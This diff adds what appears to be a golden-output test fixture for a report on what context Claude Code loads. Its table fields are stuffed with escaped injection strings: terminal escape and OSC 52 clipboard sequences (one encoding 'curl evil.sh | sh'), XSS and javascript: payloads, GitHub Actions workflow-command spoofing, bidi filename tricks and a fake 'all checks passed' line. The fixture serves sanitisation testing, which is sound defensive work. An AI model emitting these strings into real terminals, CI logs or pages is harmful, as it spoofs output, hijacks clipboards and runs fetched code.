@@ -1,0 +1,56 @@
+## Claude Code context · \:\:error\:\:cwd&lt;U\+001B&gt;\[2J&lt;U\+001B&gt;\[Hcleared
+
+**Assumes:** &lt;U\+001B&gt;\]8;;https\://evil\.example&lt;U\+001B&gt;\\click&lt;U\+001B&gt;\]8;;&lt;U\+001B&gt;\\ = x⏎\:\:add\-mask\:\:secret⏎\:\:set\-output name=a\:\:b \(rule option\)
+
+**Not visible:** zero&lt;U\+200B&gt;width&lt;U\+200C&gt;non&lt;U\+200D&gt;joiner&lt;U\+2060&gt;word&lt;U\+FEFF&gt;bom \(user\)
+
+### At session start
+
+| # | File | Bytes | ≈Tokens | Via |
+| -: | :--- | ----: | ------: | :-- |
+| 1 | \:\:error file=x\:\:pwned/CLAUDE\.md → realinvoice&lt;U\+202E&gt;txt\.exe and &lt;U\+202A&gt;embed&lt;U\+202C&gt; &lt;U\+200E&gt;&lt;U\+200F&gt;&lt;U\+061C&gt;\.md | 10 | 3 |  |
+| 2 | ↳ @&#8203;&lt;img src=x onerror=alert\(1\)&gt; &lt;script&gt;alert\(1\)&lt;/script&gt; &amp;lt;b&amp;gt; | 20 | 5 | \:\:error file=x\:\:pwned/CLAUDE\.md › copy&lt;U\+001B&gt;\]52;c;Y3VybCBldmlsLnNoIHwgc2g=&lt;U\+0007&gt;done |
+| 3 | line one⏎\:\:stop\-commands\:\:x **(cut at byte 12, line 2)** | 30 | 8 |  |
+| 4 | Skills listing (1 skill, metadata) | 40 | 10 |  |
+|  | **Total** | **100** | **≈ 26** |  |
+
+| Service | Detail |
+| :------ | :----- |
+| MCP, asks first | line one⏎\:\:error\:\:fake annotation |
+| MCP, asks first | ping @&#8203;octocat and @&#8203;github/security\-team, mail me@&#8203;example\.com · stdio · https\://evil\.example www\.evil\.example javascript\:alert\(1\) **\(no TLS\)** **\(not pinned\)** |
+| Hooks | closes \#&#8203;1, GH\-&#8203;2 and owner/repo\#&#8203;3 a \| b \|\| c \\\| d → &lt;U\+001B&gt;\[2J&lt;U\+001B&gt;\[Hcleared **\(fails open\)** **\(runs a downloaded script\)** |
+
+### On demand
+
+| File | Size | When |
+| :--- | ---: | :--- |
+| \.claude/skills/ping @&#8203;octocat and @&#8203;github/security\-team, mail me@&#8203;example\.com/SKILL\.md | body 400 bytes ≈ 100 | when the model picks it |
+| a \| b \|\| c \\\| d | 50 bytes ≈ 13 | when Claude opens \:\:warning\:\:glob, \[click\]\(javascript\:alert\(1\)\) \!\[x\]\(https\://evil\.example/p\.png\) &lt;https\://evil\.example&gt; |
+| \.claude/commands/x\.md | 60 bytes ≈ 15 | when you run /\# heading \*em\* \*\*strong\*\* \`code\` \~\~del\~\~ \$x\$ &gt; quote \- item 1\. item |
+
+### Skipped
+
+| File | Reason | Rule |
+| :--- | :----- | :--- |
+| invoice&lt;U\+202E&gt;txt\.exe and &lt;U\+202A&gt;embed&lt;U\+202C&gt; &lt;U\+200E&gt;&lt;U\+200F&gt;&lt;U\+061C&gt; › line one⏎\:\:error\:\:fake annotation | not valid JSON ? | evil\:rule,title=x |
+
+**Not read by Claude Code:** \:\:stop\-commands\:\:token
+
+### Incomplete
+
+| File | Problem |
+| :--- | :------ |
+| eight\-bit &lt;U\+009B&gt;31mCSI&lt;U\+009B&gt;0m and NEL&lt;U\+0085&gt; | not analyzed |
+| tags&lt;U\+E0001&gt;&lt;U\+E0049&gt;&lt;U\+E0067&gt;&lt;U\+E006E&gt;&lt;U\+E007F&gt;end | not analyzed\: the scan did not read the file |
+
+## Files by agent
+
+| File | Claude Code |
+| :--- | :--- |
+| \:\:error\:\:matrix | startup |
+| &lt;img src=x onerror=alert\(1\)&gt; &lt;script&gt;alert\(1\)&lt;/script&gt; &amp;lt;b&amp;gt; | skipped |
+| safe text⏎FAKE\: all checks passed | — |
+
+_≈Tokens = characters ÷ 4._
+
+_? = unverified: neither documentation nor source code confirms it._
